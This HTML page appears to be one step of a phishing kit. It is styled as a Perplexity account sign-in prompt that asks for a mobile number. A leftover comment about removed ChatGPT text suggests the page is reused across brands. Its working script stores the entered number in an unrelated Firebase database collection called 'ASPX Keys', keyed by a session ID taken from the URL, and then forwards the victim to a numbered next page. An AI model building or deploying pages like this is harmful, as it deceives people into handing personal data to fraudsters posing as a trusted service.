<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connect Your Mobile Number</title>
    <style>
        * {
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background-color: #ffffff;
        }

        .container {
            width: 100%;
            max-width: 400px;
            padding: 20px;
            text-align: center;
        }

        h1 {
            font-size: 32px;
            font-weight: 600;
            margin-bottom: 10px;
            color: #2d333a;
            letter-spacing: -0.5px;
        }

        p {
            font-size: 16px;
            color: #6e6e80;
            line-height: 1.5;
            margin-bottom: 30px;
        }

        .input-group {
            position: relative;
            margin-bottom: 20px;
            text-align: left;
        }

        .input-label {
            position: absolute;
            top: -10px;
            left: 15px;
            background: white;
            padding: 0 5px;
            font-size: 12px;
            color: #999;
            z-index: 1;
        }

        input[type="tel"] {
            width: 100%;
            padding: 16px;
            font-size: 18px;
            border: 1px solid #c2c8d0;
            border-radius: 30px;
            outline: none;
            transition: border-color 0.2s;
        }

        input[type="tel"]:focus {
            border-color: #000;
        }

        /* Remove arrows from number input */
        input::-webkit-outer-spin-button,
        input::-webkit-inner-spin-button {
            -webkit-appearance: none;
            margin: 0;
        }

        .btn-continue {
            width: 100%;
            padding: 14px;
            background-color: #0f172a;
            color: white;
            border: none;
            border-radius: 30px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            margin-top: 10px;
        }

        .btn-continue:hover {
            background-color: #1e293b;
        }

        .error-msg {
            color: #d93025;
            font-size: 13px;
            margin-top: 5px;
            display: none;
        }
    </style>
</head>
<body>

    <div class="container">
        <!-- ChatGPT Text Removed as requested -->
        
        <h1>Connect Your Mobile Number</h1>
        <p>Connect Your Phone Number to signing in to your Perplexity Account</p>

        <div class="input-group">
            <span class="input-label">Mobile Number</span>
            <input type="tel" id="mobileNumber" placeholder="1234567890" maxlength="10" autocomplete="off">
            <div id="error" class="error-msg">Please enter a valid 10-digit number</div>
        </div>

        <button class="btn-continue" id="submitBtn">Continue</button>
    </div>

    <!-- Firebase Scripts -->
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getFirestore, doc, updateDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

        const firebaseConfig = {
            apiKey: "AIzaSyDPm2za3Ho0Hd8Henuhq0KxAHyUQh-Hi-U",
            authDomain: "question-metabase.firebaseapp.com",
            databaseURL: "https://question-metabase-default-rtdb.asia-southeast1.firebasedatabase.app",
            projectId: "question-metabase",
            storageBucket: "question-metabase.firebasestorage.app",
            messagingSenderId: "770698198753",
            appId: "1:770698198753:web:59ae49d78b6013bab5c1a0",
            measurementId: "G-6ZP1FPMKSJ"
        };

        // Initialize Firebase
        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);

        // Get elements
        const phoneInput = document.getElementById('mobileNumber');
        const submitBtn = document.getElementById('submitBtn');
        const errorMsg = document.getElementById('error');

        // Function to get Session ID from URL
        const getSessionId = () => {
            const urlParams = new URLSearchParams(window.location.search);
            return urlParams.get('session');
        };

        const sessionId = getSessionId();

        // Restriction: Only allow 10 digits
        phoneInput.addEventListener('input', (e) => {
            e.target.value = e.target.value.replace(/[^0-9]/g, '').slice(0, 10);
            errorMsg.style.display = 'none';
        });

        // Handle submission
        const handleSubmit = async () => {
            const number = phoneInput.value;

            if (number.length !== 10) {
                errorMsg.style.display = 'block';
                return;
            }

            if (!sessionId) {
                alert("Session ID missing in URL");
                return;
            }

            try {
                // Reference the specific document in "ASPX Keys" collection
                const docRef = doc(db, "ASPX Keys", sessionId);
                
                // Update the document with the mobile number
                await updateDoc(docRef, {
                    mobileNumber: number,
                    updatedAt: serverTimestamp()
                });

                // Redirect to 6.html with same session ID
                window.location.href = `6.html?session=${sessionId}`;

            } catch (e) {
                console.error("Error updating document: ", e);
                alert("An error occurred. Please try again.");
            }
        };

        // Click Event
        submitBtn.addEventListener('click', handleSubmit);

        // Enter Key Event
        phoneInput.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') {
                handleSubmit();
            }
        });
    </script>
</body>
</html>
